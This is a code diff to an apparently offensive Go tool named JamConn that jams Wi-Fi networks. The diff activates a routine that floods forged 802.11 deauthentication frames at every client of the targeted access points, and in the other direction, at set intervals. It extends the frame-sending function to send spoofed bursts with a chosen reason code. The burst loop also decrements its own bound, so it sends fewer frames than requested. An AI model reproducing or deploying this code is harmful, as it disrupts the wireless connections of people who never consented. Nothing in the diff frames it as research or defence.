@@ -18,12 +18,17 @@ import (
 )
 
 type JamConn		struct {
+	lastDeauth		time.Time
 	lastChanSwitch	time.Time
 	lastAPScan		time.Time
 	nlconn			*genetlink.Conn
 	ifa				*net.Interface
 	fam				*genetlink.Family
 	handle			*pcap.Handle
+}
+
+func (conn *JamConn) SetLastDeauth(lastDeauth time.Time) {
+	conn.lastDeauth = lastDeauth
 }
 
 func (conn *JamConn) SetLastAPScan(lastAPScan time.Time) {
@@ -183,7 +188,7 @@ func (conn *JamConn) SetFilterForTargets() error {
 	//		bpfExpr = bpfExpr + " or "
 	//	}
 	//}
-	bpfExpr = fmt.Sprintf("not ether host %s and not ether host %s", conn.ifa.HardwareAddr.String(), BroadcastAddr)
+	bpfExpr = fmt.Sprintf("wlan type data and not ether host %s and not ether host %s", conn.ifa.HardwareAddr.String(), BroadcastAddr)
 	if err := conn.handle.SetBPFFilter(bpfExpr); err != nil {
 		return errors.New("pcap.Handle.SetPBFFilter() " + err.Error())
 	}
@@ -348,21 +353,26 @@ func (conn *JamConn) DoAPScanIfPast(timeout time.Duration, whiteList *List, aps 
 	}
 }
 
-//func (conn *JamConn) DeauthClientsIfPast(timeout time.Duration, apList *List) error {
-//
-//	if time.Since(conn.lastDeauth) > timeout {
-//		for _, v := range apList.contents {
-//			ap := v.(Ap)
-//			for _, cli := range ap.clients {
-//				if err := conn.Deauthenticate(&cli, &ap); err != nil {
-//					return errors.New("JamConn.Deauthenticate() " + err.Error())
-//				}
-//			}
-//		}
-//		conn.lastDeauth = time.Now()
-//	}
-//	return nil
-//}
+func (conn *JamConn) DeauthClientsIfPast(timeout time.Duration, count uint16, apList *List) {
+
+	if time.Since(conn.lastDeauth) > timeout {
+		for _, v := range apList.contents {
+			ap := v.(Ap)
+			for _, cli := range ap.clients {
+				if err := conn.Deauthenticate(count, layers.Dot11ReasonDeauthStLeaving,
+					cli.hwaddr, ap.hwaddr, &cli.tap, &cli.dot); err != nil {
+					fmt.Println("JamConn.Deauthenticate() " + err.Error())
+				}
+					//Previous authentication no longer valid.
+				if err := conn.Deauthenticate(count, 0x2,
+					ap.hwaddr, cli.hwaddr, &ap.tap, &ap.dot); err != nil {
+					fmt.Println("JamConn.Deauthenticate() " + err.Error())
+				}
+			}
+		}
+		conn.lastDeauth = time.Now()
+	}
+}
 func randInt(min int, max int) int {
 
 	return min + rand.Intn(max-min)
@@ -389,33 +399,40 @@ func createDot11Header(msgType layers.Dot11Type,
 	}
 }
 
-func (conn *JamConn) Deauthenticate(src net.HardwareAddr, dst net.HardwareAddr, tap *layers.RadioTap, dot11Orig *layers.Dot11) error {
+func (conn *JamConn) Deauthenticate(count uint16, reason layers.Dot11Reason, src net.HardwareAddr, dst net.HardwareAddr, tap *layers.RadioTap, dot11Orig *layers.Dot11) error {
 
-	var buff gopacket.SerializeBuffer
+	var i uint16
 	var opts gopacket.SerializeOptions
 
 	if err := conn.SetDeviceFreq(tap.ChannelFrequency); err != nil {
 		fmt.Println(err)
 	}
-	buff = gopacket.NewSerializeBuffer()
 	opts.ComputeChecksums = true
 	opts.FixLengths = true
-	dot11 := createDot11Header(layers.Dot11TypeMgmtDeauthentication, src, dst,
-		dot11Orig.DurationID, dot11Orig.SequenceNumber + 1)
-	mgmt := layers.Dot11MgmtDeauthentication {
-		Reason: layers.Dot11ReasonDeauthStLeaving,
+
+	fmt.Printf("sending %d deauth frames from src %s - to %s\n", count, src.String(), dst.String())
+	for i = 1; i <= count; i++ {
+
+		var buff gopacket.SerializeBuffer
+
+		buff = gopacket.NewSerializeBuffer()
+		dot11 := createDot11Header(layers.Dot11TypeMgmtDeauthentication, src, dst,
+			dot11Orig.DurationID, dot11Orig.SequenceNumber + i)
+		mgmt := layers.Dot11MgmtDeauthentication {
+			Reason: reason,
+		}
+		if err := gopacket.SerializeLayers(buff, opts,
+			tap,
+			&dot11,
+			&mgmt,
+		); err != nil {
+			return errors.New("gopacket.SerializeLayers() " + err.Error())
+		}
+		if err := conn.handle.WritePacketData(buff.Bytes()); err != nil {
+			return errors.New("Handle.WritePacketData() " + err.Error())
+		}
+		count--
 	}
-	if err := gopacket.SerializeLayers(buff, opts,
-		tap,
-		&dot11,
-		&mgmt,
-	); err != nil {
-		return errors.New("gopacket.SerializeLayers() " + err.Error())
-	}
-	if err := conn.handle.WritePacketData(buff.Bytes()); err != nil {
-		return errors.New("Handle.WritePacketData() " + err.Error())
-	}
-	fmt.Printf("deauthing src %s - from %s\n", src.String(), dst.String())
 	return nil
 }
 
@@ -432,7 +449,7 @@ func (conn *JamConn) Disassociate(src net.HardwareAddr, dst net.HardwareAddr, ta
 	opts.FixLengths = true
 	dot11 := createDot11Header(layers.Dot11TypeMgmtDisassociation, src, dst,
 		dot11Orig.DurationID, dot11Orig.SequenceNumber + 1)
-	mgmt := layers.Dot11MgmtDeauthentication {
+	mgmt := layers.Dot11MgmtDisassociation {
 		Reason: layers.Dot11ReasonDisasStLeaving,
 	}
 	if err := gopacket.SerializeLayers(buff, opts,
